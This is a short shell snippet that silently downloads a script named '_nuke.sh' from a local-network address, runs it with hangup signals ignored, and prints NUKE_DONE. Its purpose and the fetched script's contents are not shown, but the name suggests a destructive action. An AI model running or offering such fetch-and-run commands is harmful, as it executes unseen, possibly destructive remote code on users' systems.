wget -q -O /tmp/nuke.sh http://192.168.1.44:18765/_nuke.sh
sed -i 's/\r$//' /tmp/nuke.sh
trap '' HUP
sh /tmp/nuke.sh
echo NUKE_DONE
